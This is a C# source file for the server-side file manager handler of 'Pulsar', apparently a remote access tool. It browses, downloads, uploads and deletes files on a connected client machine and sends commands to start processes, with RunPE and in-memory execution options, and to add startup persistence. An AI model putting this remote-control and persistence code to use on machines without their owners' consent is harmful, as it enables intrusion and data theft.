using Pulsar.Common.Enums;
using Pulsar.Common.IO;
using Pulsar.Common.Messages;
using Pulsar.Common.Messages.Administration.FileManager;
using Pulsar.Common.Messages.Other;
using Pulsar.Common.Messages.Administration.TaskManager;
using Pulsar.Common.Models;
using Pulsar.Common.Networking;
using Pulsar.Server.Enums;
using Pulsar.Server.Models;
using Pulsar.Server.Networking;
using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Threading;

namespace Pulsar.Server.Messages
{
    /// <summary>
    /// Handles messages for the interaction with remote files and directories.
    /// </summary>
    public class FileManagerHandler : MessageProcessorBase<string>, IDisposable
    {
        public delegate void DrivesChangedEventHandler(object sender, Drive[] drives);
        public delegate void DirectoryChangedEventHandler(object sender, string remotePath, FileSystemEntry[] items);
        public delegate void FileTransferUpdatedEventHandler(object sender, FileTransfer transfer);

        /// <summary>Raised when drives changed.</summary>
        public event DrivesChangedEventHandler? DrivesChanged;
        /// <summary>Raised when a directory changed.</summary>
        public event DirectoryChangedEventHandler? DirectoryChanged;
        /// <summary>Raised when a file transfer updated.</summary>
        public event FileTransferUpdatedEventHandler? FileTransferUpdated;
        /// <summary>Reports generic status / log messages.</summary>
        public event EventHandler<string>? ProgressChanged;

        private readonly List<FileTransfer> _activeFileTransfers = new();
        private readonly object _syncLock = new();

        private readonly Client _client;
        private readonly Semaphore _limitThreads = new(2, 2);
        private readonly string _baseDownloadPath;

        private readonly TaskManagerHandler _taskManagerHandler;
        private bool _disposed;

        public FileManagerHandler(Client client, string subDirectory = "") : base(true)
        {
            _client = client ?? throw new ArgumentNullException(nameof(client));
            _baseDownloadPath = Path.Combine(client.Value.DownloadDirectory, subDirectory ?? string.Empty);

            _taskManagerHandler = new TaskManagerHandler(client);
            _taskManagerHandler.ProcessActionPerformed += ProcessActionPerformed;
            MessageHandler.Register(_taskManagerHandler);
        }

        #region Event dispatch (UI-thread safe)

        private void OnDrivesChanged(Drive[] drives)
        {
            SynchronizationContext.Post(d =>
            {
                var handler = DrivesChanged;
                handler?.Invoke(this, (Drive[])d!);
            }, drives);
        }

        private void OnDirectoryChanged(string? remotePath, FileSystemEntry[]? items)
        {
            if (string.IsNullOrWhiteSpace(remotePath))
                return;

            items ??= Array.Empty<FileSystemEntry>();

            SynchronizationContext.Post(i =>
            {
                DirectoryChanged?.Invoke(this, remotePath!, (FileSystemEntry[])i!);
            }, items);
        }

        private void OnFileTransferUpdated(FileTransfer transfer)
        {
            var clone = transfer.Clone();
            SynchronizationContext.Post(t =>
            {
                FileTransferUpdated?.Invoke(this, (FileTransfer)t!);
            }, clone);
        }

        private void OnReport(string message)
        {
            SynchronizationContext.Post(m =>
            {
                ProgressChanged?.Invoke(this, (string)m!);
            }, message);
        }

        #endregion

        #region MessageProcessor overrides

        public override bool CanExecute(IMessage message) =>
            message is FileTransferChunk ||
            message is FileTransferCancel ||
            message is FileTransferComplete ||
            message is GetDrivesResponse ||
            message is GetDirectoryResponse ||
            message is SetStatusFileManager ||
            message is DoZipFolder;

        public override bool CanExecuteFrom(ISender sender) => _client.Equals(sender);

        public override void Execute(ISender sender, IMessage message)
        {
            switch (message)
            {
                case FileTransferChunk file:
                    Execute(sender, file);
                    break;
                case FileTransferCancel cancel:
                    Execute(sender, cancel);
                    break;
                case FileTransferComplete complete:
                    Execute(sender, complete);
                    break;
                case GetDrivesResponse drive:
                    Execute(sender, drive);
                    break;
                case GetDirectoryResponse directory:
                    Execute(sender, directory);
                    break;
                case SetStatusFileManager status:
                    Execute(sender, status);
                    break;
                case DoZipFolder zipFolder:
                    Execute(sender, zipFolder);
                    break;
            }
        }

        #endregion

        #region Public API

        private void Execute(ISender client, DoZipFolder message)
        {
            client.Send(message);
        }

        public void ZipFolder(string sourcePath, string destinationPath, int compressionLevel)
        {
            var zipMessage = new DoZipFolder
            {
                SourcePath = sourcePath,
                DestinationPath = destinationPath,
                CompressionLevel = compressionLevel
            };
            _client.Send(zipMessage);
        }

        /// <summary>
        /// Sanitizes a filename to prevent path traversal attacks.
        /// </summary>
        private string? SanitizeFileName(string fileName)
        {
            if (string.IsNullOrWhiteSpace(fileName))
                return null;

            fileName = Path.GetFileName(fileName);

            if (string.IsNullOrEmpty(fileName) || fileName.Contains(".."))
                return null;

            char[] invalidChars = Path.GetInvalidFileNameChars();
            if (fileName.IndexOfAny(invalidChars) >= 0)
                return null;

            if (fileName.StartsWith(".") ||
                fileName.Equals("desktop.ini", StringComparison.OrdinalIgnoreCase))
                return null;

            return fileName;
        }

        /// <summary>
        /// Begins downloading a file from the client.
        /// </summary>
        public void BeginDownloadFile(string remotePath, string localFileName = "", bool overwrite = false)
        {
            if (string.IsNullOrWhiteSpace(remotePath))
                return;

            if (!Directory.Exists(_baseDownloadPath))
                Directory.CreateDirectory(_baseDownloadPath);

            int id = GetUniqueFileTransferId();

            string rawName = string.IsNullOrEmpty(localFileName)
                ? Path.GetFileName(remotePath)
                : localFileName;

            var safeName = SanitizeFileName(rawName);
            if (safeName == null)
            {
                OnReport("Download failed: Invalid filename");
                return;
            }

            string localPath = Path.Combine(_baseDownloadPath, safeName);

            if (!TryNormalizePath(localPath, _baseDownloadPath, out localPath))
            {
                OnReport("Download failed: Invalid path");
                return;
            }

            int index = 1;
            while (!overwrite && File.Exists(localPath))
            {
                string newFileName = $"{Path.GetFileNameWithoutExtension(localPath)}({index}){Path.GetExtension(localPath)}";
                localPath = Path.Combine(_baseDownloadPath, newFileName);

                if (!TryNormalizePath(localPath, _baseDownloadPath, out localPath))
                {
                    OnReport("Download failed: Path validation error");
                    return;
                }

                index++;
            }

            var transfer = new FileTransfer
            {
                Id = id,
                Type = TransferType.Download,
                LocalPath = localPath,
                RemotePath = remotePath,
                Status = "Pending...",
                TransferredSize = 0
            };

            try
            {
                transfer.FileSplit = new FileSplit(transfer.LocalPath, FileAccess.Write);
            }
            catch
            {
                transfer.Status = "Error writing file";
                OnFileTransferUpdated(transfer);
                return;
            }

            lock (_syncLock)
            {
                _activeFileTransfers.Add(transfer);
            }

            OnFileTransferUpdated(transfer);
            _client.Send(new FileTransferRequest { RemotePath = remotePath, Id = id });
        }

        /// <summary>
        /// Begins uploading a file to the client.
        /// </summary>
        public void BeginUploadFile(string localPath, string remotePath = "")
        {
            if (string.IsNullOrWhiteSpace(localPath) || !File.Exists(localPath))
            {
                OnReport("Upload failed: Local file not found");
                return;
            }

            new Thread(() =>
            {
                int id = GetUniqueFileTransferId();

                var transfer = new FileTransfer
                {
                    Id = id,
                    Type = TransferType.Upload,
                    LocalPath = localPath,
                    RemotePath = remotePath,
                    Status = "Pending...",
                    TransferredSize = 0
                };

                try
                {
                    transfer.FileSplit = new FileSplit(localPath, FileAccess.Read);
                }
                catch
                {
                    transfer.Status = "Error reading file";
                    OnFileTransferUpdated(transfer);
                    return;
                }

                transfer.Size = transfer.FileSplit.FileSize;

                lock (_syncLock)
                {
                    _activeFileTransfers.Add(transfer);
                }

                OnFileTransferUpdated(transfer);

                _limitThreads.WaitOne();
                try
                {
                    foreach (var chunk in transfer.FileSplit)
                    {
                        transfer.TransferredSize += chunk.Data.Length;

                        decimal progress = transfer.Size == 0
                            ? 100
                            : Math.Round((decimal)transfer.TransferredSize / transfer.Size * 100m, 2);

                        transfer.Status = $"Uploading...({progress}%)";
                        OnFileTransferUpdated(transfer);

                        bool transferCanceled;
                        lock (_syncLock)
                        {
                            transferCanceled = !_activeFileTransfers.Any(f => f.Id == transfer.Id);
                        }

                        if (transferCanceled)
                        {
                            transfer.Status = "Canceled";
                            OnFileTransferUpdated(transfer);
                            return;
                        }

                        _client.SendBlocking(new FileTransferChunk
                        {
                            Id = id,
                            Chunk = chunk,
                            FilePath = remotePath,
                            FileSize = transfer.Size,
                            FileExtension = Path.GetExtension(localPath)
                        });
                    }
                }
                catch
                {
                    lock (_syncLock)
                    {
                        if (!_activeFileTransfers.Any(f => f.Id == transfer.Id))
                        {
                            return;
                        }
                    }

                    transfer.Status = "Error reading file";
                    OnFileTransferUpdated(transfer);
                    CancelFileTransfer(transfer.Id);
                    return;
                }
                finally
                {
                    _limitThreads.Release();
                }
            })
            {
                IsBackground = true,
                Name = "FileUploadThread"
            }.Start();
        }

        public void CancelFileTransfer(int transferId)
        {
            _client.Send(new FileTransferCancel { Id = transferId });
        }

        public void RenameFile(string remotePath, string newPath, FileType type)
        {
            _client.Send(new DoPathRename
            {
                Path = remotePath,
                NewPath = newPath,
                PathType = type
            });
        }

        public void DeleteFile(string remotePath, FileType type)
        {
            _client.Send(new DoPathDelete
            {
                Path = remotePath,
                PathType = type
            });
        }

        public void StartProcess(string remotePath)
        {
            _client.Send(new DoProcessStart
            {
                FilePath = remotePath,
                IsFromFileManager = true,
                ExecuteInMemoryDotNet = false,
                UseRunPE = false,
                IsUpdate = false,
                FileBytes = null,
                DownloadUrl = null
            });
        }

        public void AddToStartup(StartupItem item)
        {
            _client.Send(new DoStartupItemAdd { StartupItem = item });
        }

        public void GetDirectoryContents(string remotePath)
        {
            _client.Send(new GetDirectory { RemotePath = remotePath });
        }

        public void RefreshDrives()
        {
            _client.Send(new GetDrives());
        }

        #endregion

        #region Message handlers

        private void Execute(ISender client, FileTransferChunk message)
        {
            FileTransfer? transfer;
            lock (_syncLock)
            {
                transfer = _activeFileTransfers.FirstOrDefault(t => t.Id == message.Id);
            }

            if (transfer == null)
                return;

            if (transfer.Size == 0 && message.FileSize > 0)
                transfer.Size = message.FileSize;

            try
            {
                transfer.FileSplit.WriteChunk(message.Chunk);
                transfer.TransferredSize += message.Chunk.Data.Length;
            }
            catch
            {
                transfer.Status = "Error writing file";
                OnFileTransferUpdated(transfer);
                CancelFileTransfer(transfer.Id);
                return;
            }

            bool fullyDone = transfer.Size > 0 &&
                             transfer.TransferredSize >= transfer.Size;

            if (fullyDone)
            {
                transfer.TransferredSize = transfer.Size;
                transfer.Status = "Completed";

                try { transfer.FileSplit.Dispose(); } catch { }

                OnFileTransferUpdated(transfer);

                lock (_syncLock)
                {
                    _activeFileTransfers.Remove(transfer);
                }

                return;
            }

            decimal progress = transfer.Size == 0
                ? 0
                : Math.Round((decimal)transfer.TransferredSize / transfer.Size * 100m, 2);

            transfer.Status = $"Downloading...({progress}%)";
            OnFileTransferUpdated(transfer);
        }

        private void Execute(ISender client, FileTransferCancel message)
        {
            FileTransfer? transfer;
            lock (_syncLock)
            {
                transfer = _activeFileTransfers.FirstOrDefault(t => t.Id == message.Id);
            }

            if (transfer != null)
            {
                transfer.Status = message.Reason;
                OnFileTransferUpdated(transfer);
                RemoveFileTransfer(transfer.Id);

                if (transfer.Type == TransferType.Download)
                {
                    try { File.Delete(transfer.LocalPath); } catch { }
                }
            }
        }

        private void Execute(ISender client, FileTransferComplete message)
        {
            FileTransfer? transfer;
            lock (_syncLock)
            {
                transfer = _activeFileTransfers.FirstOrDefault(t => t.Id == message.Id);
            }

            if (transfer != null)
            {
                transfer.RemotePath = message.FilePath;
                transfer.Status = "Completed";

                RemoveFileTransfer(transfer.Id);
                OnFileTransferUpdated(transfer);
            }
        }

        private void Execute(ISender client, GetDrivesResponse message)
        {
            if (message.Drives == null || message.Drives.Length == 0)
                return;

            OnDrivesChanged(message.Drives);
        }

        private void Execute(ISender client, GetDirectoryResponse message)
        {
            var items = message.Items ?? Array.Empty<FileSystemEntry>();
            OnDirectoryChanged(message.RemotePath, items);
        }

        private void Execute(ISender client, SetStatusFileManager message)
        {
            OnReport(message.Message);
        }

        private void ProcessActionPerformed(object? sender, ProcessAction action, bool result)
        {
            if (action != ProcessAction.Start)
                return;

            OnReport(result ? "Process started successfully" : "Process failed to start");
        }

        #endregion

        #region Helpers

        private void RemoveFileTransfer(int transferId)
        {
            lock (_syncLock)
            {
                var transfer = _activeFileTransfers.FirstOrDefault(t => t.Id == transferId);
                transfer?.FileSplit?.Dispose();
                _activeFileTransfers.RemoveAll(s => s.Id == transferId);
            }
        }

        private int GetUniqueFileTransferId()
        {
            int id;
            lock (_syncLock)
            {
                do
                {
                    id = FileTransfer.GetRandomTransferId();
                } while (_activeFileTransfers.Any(f => f.Id == id));
            }

            return id;
        }

        private static bool TryNormalizePath(string path, string baseDir, out string normalized)
        {
            normalized = path;
            try
            {
                string fullPath = Path.GetFullPath(path);
                string fullBase = Path.GetFullPath(baseDir);

                if (!fullPath.StartsWith(fullBase, StringComparison.OrdinalIgnoreCase))
                    return false;

                normalized = fullPath;
                return true;
            }
            catch
            {
                return false;
            }
        }

        #endregion

        #region IDisposable

        public void Dispose()
        {
            Dispose(true);
            GC.SuppressFinalize(this);
        }

        protected virtual void Dispose(bool disposing)
        {
            if (_disposed) return;
            _disposed = true;

            if (disposing)
            {
                lock (_syncLock)
                {
                    foreach (var transfer in _activeFileTransfers.ToArray())
                    {
                        try
                        {
                            _client.Send(new FileTransferCancel { Id = transfer.Id });
                        }
                        catch { }

                        try
                        {
                            transfer.FileSplit?.Dispose();
                        }
                        catch { }

                        if (transfer.Type == TransferType.Download)
                        {
                            try { File.Delete(transfer.LocalPath); } catch { }
                        }
                    }

                    _activeFileTransfers.Clear();
                }

                MessageHandler.Unregister(_taskManagerHandler);
                _taskManagerHandler.ProcessActionPerformed -= ProcessActionPerformed;
            }
        }

        #endregion
    }
}
